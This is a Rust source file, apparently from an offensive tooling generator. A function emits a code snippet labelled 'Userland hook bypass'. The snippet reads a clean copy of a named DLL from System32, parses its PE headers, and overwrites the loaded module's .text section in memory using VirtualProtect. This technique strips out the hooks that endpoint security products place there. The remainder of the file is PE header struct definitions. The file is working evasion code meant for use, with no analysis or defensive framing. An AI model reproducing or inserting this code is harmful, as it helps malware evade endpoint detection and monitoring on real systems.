pub fn unhook_dll_snippet(dll_name: &str) -> String {
    format!(
        r#"    // Userland hook bypass: fresh copy of {dll_name}
    {{
        use windows_sys::Win32::System::LibraryLoader::*;
        use windows_sys::Win32::System::Memory::*;
        use windows_sys::Win32::Storage::FileSystem::*;
        use windows_sys::Win32::Foundation::*;
        use std::ffi::c_void;

        unsafe {{
            let dll_path: Vec<u16> = "C:\\Windows\\System32\\{dll_name}"
                .encode_utf16().chain(std::iter::once(0)).collect();

            let file_handle = CreateFileW(
                dll_path.as_ptr(),
                FILE_GENERIC_READ,
                FILE_SHARE_READ,
                std::ptr::null(),
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                std::ptr::null_mut(),
            );
            if file_handle == INVALID_HANDLE_VALUE {{ return; }}

            let mapping = CreateFileMappingW(
                file_handle,
                std::ptr::null(),
                PAGE_READONLY,
                0,
                0,
                std::ptr::null(),
            );
            if mapping.is_null() {{
                CloseHandle(file_handle);
                return;
            }}

            let mapped_view = MapViewOfFile(mapping, FILE_MAP_READ, 0, 0, 0);
            if mapped_view.Value.is_null() {{
                CloseHandle(mapping);
                CloseHandle(file_handle);
                return;
            }}

            let dll_name_w: Vec<u16> = "{dll_name}"
                .encode_utf16().chain(std::iter::once(0)).collect();
            let loaded_module = GetModuleHandleW(dll_name_w.as_ptr());
            if loaded_module.is_null() {{
                UnmapViewOfFile(mapped_view);
                CloseHandle(mapping);
                CloseHandle(file_handle);
                return;
            }}

            let loaded_base = loaded_module as *const u8;
            let clean_base = mapped_view.Value as *const u8;

            // Parse PE headers to find .text section
            let e_lfanew = *(clean_base.add(0x3C) as *const i32);
            let nt_headers = clean_base.add(e_lfanew as usize);
            let section_count = *(nt_headers.add(6) as *const u16);
            let opt_header_size = *(nt_headers.add(20) as *const u16) as usize;
            let sections_ptr = nt_headers.add(24 + opt_header_size);

            for i in 0..section_count as usize {{
                let section = sections_ptr.add(i * 40);
                let name = std::slice::from_raw_parts(section, 8);
                if name.starts_with(b".text") {{
                    let section_va = *(section.add(12) as *const u32) as usize;
                    let section_size = *(section.add(16) as *const u32) as usize;
                    let raw_offset = *(section.add(20) as *const u32) as usize;

                    let dest = loaded_base.add(section_va) as *mut c_void;
                    let src = clean_base.add(raw_offset);

                    let mut old_protect = 0u32;
                    VirtualProtect(dest, section_size, PAGE_EXECUTE_WRITECOPY, &mut old_protect);
                    std::ptr::copy_nonoverlapping(src, dest as *mut u8, section_size);
                    let mut tmp = 0u32;
                    VirtualProtect(dest, section_size, PAGE_EXECUTE_READ, &mut tmp);
                    break;
                }}
            }}

            UnmapViewOfFile(mapped_view);
            CloseHandle(mapping);
            CloseHandle(file_handle);
        }}
    }}"#,
        dll_name = dll_name
    )
}

// PE header structures needed for parsing (used in generated code context)
#[allow(dead_code)]
#[repr(C)]
struct IMAGE_DOS_HEADER {
    e_magic: u16,
    e_lfanew: i32,
}

#[allow(dead_code)]
#[repr(C)]
struct IMAGE_NT_HEADERS64 {
    signature: u32,
    file_header: IMAGE_FILE_HEADER,
    optional_header: [u8; 240],
}

#[allow(dead_code)]
#[repr(C)]
struct IMAGE_FILE_HEADER {
    machine: u16,
    number_of_sections: u16,
    time_date_stamp: u32,
    pointer_to_symbol_table: u32,
    number_of_symbols: u32,
    size_of_optional_header: u16,
    characteristics: u16,
}

#[allow(dead_code)]
#[repr(C)]
struct IMAGE_SECTION_HEADER {
    name: [u8; 8],
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
    pointer_to_relocations: u32,
    pointer_to_linenumbers: u32,
    number_of_relocations: u16,
    number_of_linenumbers: u16,
    characteristics: u32,
}
